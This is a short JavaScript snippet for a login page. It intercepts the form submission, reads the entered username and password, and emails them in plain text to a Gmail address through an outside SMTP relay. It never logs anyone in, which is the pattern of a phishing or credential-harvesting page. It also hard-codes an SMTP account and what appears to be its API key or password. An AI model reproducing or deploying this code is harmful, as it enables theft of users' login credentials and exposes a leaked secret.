const form = document.querySelector("form"); // Assuming your form has an ID of "login-form"
const user = document.getElementById("user");
const pass = document.getElementById("pass");

function sendEmail() {
    const bodyMessage = `Username : ${user.value}<br> Password: ${pass.value}`;


  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "bacalso318@gmail.com",
    Password: "33DCE184EAE57900E10985C0DDAEA9D2C702",
    To: 'bacalso318@gmail.com',
    From: "bacalso318@gmail.com",
    Subject: "This is the subject",
    Body: bodyMessage
  }).then(
    message => alert(message)
  );
}

form.addEventListener("submit", (e) => {
  e.preventDefault();
  sendEmail();
});